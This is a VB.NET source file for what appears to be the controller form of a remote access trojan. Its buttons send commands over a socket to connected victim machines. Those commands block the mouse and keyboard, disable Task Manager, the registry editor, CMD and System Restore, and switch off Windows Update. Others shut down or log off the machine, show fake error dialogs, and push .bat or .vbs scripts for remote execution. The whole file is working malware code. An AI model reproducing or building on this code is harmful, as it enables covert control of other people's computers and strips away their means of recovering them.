Imports System.Runtime.InteropServices

Public Class fun
    Public sock As Integer
    Public f As Form1
    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(x.ToolTipText, "opencd") ' ask server to open cd rome
        Next
    End Sub

    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(x.ToolTipText, "closecd") ' ask server to close cd rome
        Next
    End Sub

    Private Sub Button4_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button4.Click
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(x.ToolTipText, "blockmouseandkeyboard") ' ask server to block keyboard and mouse
        Next
    End Sub

    Private Sub Button3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button3.Click
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(x.ToolTipText, "unblockmouseandkeyboard") ' ask server to unblock keyboard and mouse
        Next
    End Sub

    Private Sub Button5_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button5.Click
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(x.ToolTipText, "showtb") ' ask server to show taskbar
        Next
    End Sub

    Private Sub Button6_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button6.Click
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(x.ToolTipText, "hidetb") ' ask server to hide taskbar
        Next
    End Sub

    Private Sub Button7_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button7.Click
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(x.ToolTipText, "winupdateon") ' ask server to turn on Update
        Next
    End Sub

    Private Sub Button8_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button8.Click
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(x.ToolTipText, "winupdateoff") ' ask server to turn off Update
        Next
    End Sub

    Private Sub Button10_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button10.Click
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(x.ToolTipText, "shutdowncomputer") ' ask server to shutdown
        Next
    End Sub

    Private Sub Button11_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button11.Click
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(x.ToolTipText, "restartcomputer") ' ask server to restart
        Next
    End Sub

    Private Sub Button9_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button9.Click
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(x.ToolTipText, "logoff") ' ask server to close session
        Next
    End Sub

    Private Sub Button15_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button15.Click
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(x.ToolTipText, "TurnOffMonitor") ' ask server to turn off monitor
        Next
    End Sub

    Private Sub Button14_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button14.Click
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(x.ToolTipText, "TurnOnMonitor") ' ask server to turn on monitor
        Next
    End Sub

    Private Sub Button17_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button17.Click
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(x.ToolTipText, "ReverseMouse") ' ask server to reverse mouse
        Next
    End Sub

    Private Sub Button16_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button16.Click
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(x.ToolTipText, "NormalMouse") ' ask server to unreverse mouse
        Next
    End Sub

    Private Sub Button12_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button12.Click
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(x.ToolTipText, "EnableCMD") ' ask server to enable cmd
        Next
    End Sub

    Private Sub Button13_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button13.Click
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(x.ToolTipText, "DisableCMD") ' ask server to disable cmd
        Next
    End Sub

    Private Sub Button19_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button19.Click
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(x.ToolTipText, "EnableRegistry") ' ask server to enable registry
        Next
    End Sub

    Private Sub Button18_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button18.Click
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(x.ToolTipText, "DisableRegistry") ' ask server to disable registry
        Next
    End Sub

    Private Sub Button21_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button21.Click
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(x.ToolTipText, "EnableRestore") ' ask server to enable restore
        Next
    End Sub

    Private Sub Button20_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button20.Click
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(x.ToolTipText, "disable restore") ' ask server to disable restore
        Next
    End Sub

    Private Sub Button23_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button23.Click
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(x.ToolTipText, "EnableTaskManager") ' ask server to enable task manager 
        Next
    End Sub

    Private Sub Button22_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button22.Click
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(x.ToolTipText, "DisableTaskManager") ' ask server to disable task manager
        Next
    End Sub

    Private Sub Button25_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button25.Click
        Form1.s.Send(sock, "SoundON")
    End Sub

    Private Sub Button24_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button24.Click
        Form1.s.Send(sock, "SoundOFF")
    End Sub

    Private Sub Button27_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button27.Click
        Form1.s.Send(sock, "IconsON")
    End Sub

    Private Sub Button26_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button26.Click
        Form1.s.Send(sock, "IconsOFF")
    End Sub

    Private Sub Button30_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button30.Click
        Form1.s.Send(sock, "TaskbarHide")
    End Sub

    Private Sub Button31_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button31.Click
        Form1.s.Send(sock, "TaskbarShow")
    End Sub

    Private Sub Button32_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button32.Click
        Form1.s.Send(sock, "ClockOFF")
    End Sub

    Private Sub Button33_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button33.Click
        Form1.s.Send(sock, "ClockON")
    End Sub

    Private Sub Button28_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button28.Click
        Form1.s.Send(sock, "CursorHide")
    End Sub

    Private Sub Button29_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button29.Click
        Form1.s.Send(sock, "CursorShow")
    End Sub

    Private Sub Button34_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button34.Click
        Form1.s.Send(sock, "IEhome" & Form1.yy & TextBox1.Text)
    End Sub

    Private Sub Button38_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button38.Click
        Dim x As MessageBoxIcon
        Dim y As MessageBoxButtons

        If RadioButton1.Checked = True Then
            x = MessageBoxIcon.Information
        ElseIf RadioButton2.Checked Then
            x = MessageBoxIcon.Question
        ElseIf RadioButton3.Checked Then
            x = MessageBoxIcon.Warning
        ElseIf RadioButton4.Checked Then
            x = MessageBoxIcon.Error
        Else
            x = MessageBoxIcon.Asterisk
        End If
        '#################################################################"
        If RadioButton5.Checked Then
            y = MessageBoxButtons.YesNo

        ElseIf RadioButton6.Checked Then
            y = MessageBoxButtons.YesNoCancel
        ElseIf RadioButton7.Checked Then
            y = MessageBoxButtons.OK
        ElseIf RadioButton8.Checked Then
            y = MessageBoxButtons.OKCancel
        ElseIf RadioButton9.Checked Then
            y = MessageBoxButtons.RetryCancel

        ElseIf RadioButton10.Checked Then
            y = MessageBoxButtons.AbortRetryIgnore
        Else
            y = MessageBoxButtons.OK
        End If
        MessageBox.Show(TextBox5.Text, TextBox6.Text, y, x)

    End Sub
    Public ReadOnly Property title
        Get
            Return TextBox6.Text
        End Get
    End Property
    Public ReadOnly Property message
        Get
            Return TextBox5.Text
        End Get
    End Property
    Public ReadOnly Property messageicon
        Get
            If RadioButton1.Checked Then
                Return "1"
            ElseIf RadioButton2.Checked Then
                Return "2"
            ElseIf RadioButton3.Checked Then
                Return "3"
            ElseIf RadioButton4.Checked Then
                Return "4"
            Else
                Return "1"
            End If
        End Get
    End Property
    Public ReadOnly Property messagebutton
        Get
            If RadioButton5.Checked Then
                Return "1"
            ElseIf RadioButton6.Checked Then
                Return "2"
            ElseIf RadioButton7.Checked Then
                Return "3"
            ElseIf RadioButton8.Checked Then
                Return "4"
            ElseIf RadioButton9.Checked Then
                Return "5"
            ElseIf RadioButton10.Checked Then
                Return "6"
            Else
                Return "1"
            End If
        End Get
    End Property

    Private Sub Button39_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button39.Click
        Form1.s.Send(sock, "ErorrMsg" & Form1.yy & messageicon & Form1.yy & messagebutton & Form1.yy & title & Form1.yy & message)
    End Sub

    <DllImport("KERNEL32.DLL")> _
    Public Shared Sub Beep(ByVal freq As Integer, ByVal dur As Integer)
    End Sub
    Private Sub Button45_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button45.Click
        Form1.s.Send(sock, "piano" & Form1.yy & 623)
        If Check_Sound.Checked = False Then Exit Sub
        Beep(623, 300)
    End Sub

    Private Sub Button46_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button46.Click
        Form1.s.Send(sock, "piano" & Form1.yy & 593)
        If Check_Sound.Checked = False Then Exit Sub
        Beep(593, 300)
    End Sub

    Private Sub Button47_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button47.Click
        Form1.s.Send(sock, "piano" & Form1.yy & 540)
        If Check_Sound.Checked = False Then Exit Sub
        Beep(540, 300)
    End Sub

    Private Sub Button48_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button48.Click
        Form1.s.Send(sock, "piano" & Form1.yy & 491)
        If Check_Sound.Checked = False Then Exit Sub
        Beep(491, 300)
    End Sub

    Private Sub Button49_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button49.Click
        Form1.s.Send(sock, "piano" & Form1.yy & 449)
        If Check_Sound.Checked = False Then Exit Sub
        Beep(449, 300)
    End Sub

    Private Sub Button50_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button50.Click
        Form1.s.Send(sock, "piano" & Form1.yy & 429)
        If Check_Sound.Checked = False Then Exit Sub
        Beep(429, 300)
    End Sub

    Private Sub Button51_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button51.Click
        Form1.s.Send(sock, "piano" & Form1.yy & 393)
        If Check_Sound.Checked = False Then Exit Sub
        Beep(393, 300)
    End Sub

    Private Sub Button52_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button52.Click
        Form1.s.Send(sock, "piano" & Form1.yy & 361)
        If Check_Sound.Checked = False Then Exit Sub
        Beep(361, 300)
    End Sub

    Private Sub Button40_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button40.Click
        Form1.s.Send(sock, "piano" & Form1.yy & 466)
        If Check_Sound.Checked = False Then Exit Sub
        Beep(466, 300)
    End Sub

    Private Sub Button41_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button41.Click
        Form1.s.Send(sock, "piano" & Form1.yy & 415)
        If Check_Sound.Checked = False Then Exit Sub
        Beep(415, 300)
    End Sub

    Private Sub Button42_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button42.Click
        Form1.s.Send(sock, "piano" & Form1.yy & 369)
        If Check_Sound.Checked = False Then Exit Sub
        Beep(369, 300)
    End Sub

    Private Sub Button43_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button43.Click
        Form1.s.Send(sock, "piano" & Form1.yy & 311)
        If Check_Sound.Checked = False Then Exit Sub
        Beep(311, 300)
    End Sub

    Private Sub Button44_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button44.Click
        Form1.s.Send(sock, "piano" & Form1.yy & 277)
        If Check_Sound.Checked = False Then Exit Sub
        Beep(277, 300)
    End Sub

    Private Sub Button35_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button35.Click
        Form1.s.Send(sock, "BepX" & Form1.yy & TextBox2.Text & Form1.yy & TextBox3.Text)
    End Sub

    Private Sub Button36_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button36.Click
        Form1.s.Send(sock, "TextToSpeech" & Form1.yy & TextBox4.Text)
    End Sub

    Private Sub Button37_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button37.Click
        Dim SAPI = CreateObject("SAPI.Spvoice")
        SAPI.speak(TextBox4.Text)
    End Sub

    Private Sub Button56_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button56.Click
        Dim o As New OpenFileDialog
        If o.ShowDialog() = Windows.Forms.DialogResult.OK Then
            Dim n As New IO.FileInfo(o.FileName)
            Form1.s.Send(sock, "sendmusicplay" & Form1.yy & n.Name & Form1.yy & Convert.ToBase64String(IO.File.ReadAllBytes(o.FileName)))

        End If
    End Sub

    Private Sub Button57_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button57.Click
        Form1.s.Send(sock, "errorsound")
    End Sub
    Private Sub Button58_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button58.Click
        Dim ex As String = ""
        If RadioButton11.Checked = True Then
            ex = ".html"
        ElseIf RadioButton12.Checked = True Then
            ex = ".bat"
        ElseIf RadioButton13.Checked = True Then
            ex = ".vbs"
        End If

        Form1.s.Send(sock, "script" & Form1.yy & TextBox8.Text & Form1.yy & ex)

    End Sub

    Private Sub fun_Load(sender As Object, e As EventArgs) Handles MyBase.Load

    End Sub
End Class